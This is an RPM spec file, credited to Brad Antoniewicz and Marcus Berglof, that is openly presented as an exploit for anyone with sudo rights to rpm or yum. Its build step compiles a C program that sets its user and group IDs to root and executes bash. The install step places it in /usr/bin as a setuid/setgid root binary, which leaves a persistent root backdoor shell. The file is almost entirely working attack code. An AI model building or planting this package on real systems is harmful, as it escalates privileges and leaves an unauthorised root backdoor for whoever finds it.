%define name suidshell
%define version 0.1
%define release 1

Summary: SUID bash shell
Name: %{name}
Version: %{version}
Release: %{release}
License: BSD v3
Group: System Environment/Libraries
Vendor: Marcus Berglof

Requires: /bin/bash

BuildRequires: gcc

%description
Designed to create a setuid root binary that executes bash.
Exploit requires sudo rights to either rpm or yum.

-Depends
requires BASH in /bin/bash


Creates a root shell in /usr/bin

Original By Brad Antoniewicz
Foundstone

Fixed by Marcus Berglof
Funding Circle

%build
cat > suidshell.c << EOF
#include <stdio.h>
int main() {
setuid(0);
setgid(0);
execl("/bin/bash", "-bash", NULL);
return 0;
}
EOF
gcc -o suidshell suidshell.c

%install
%{__install} -p -D -m 6755 suidshell %{buildroot}/usr/bin/suidshell

%files
/usr/bin/suidshell
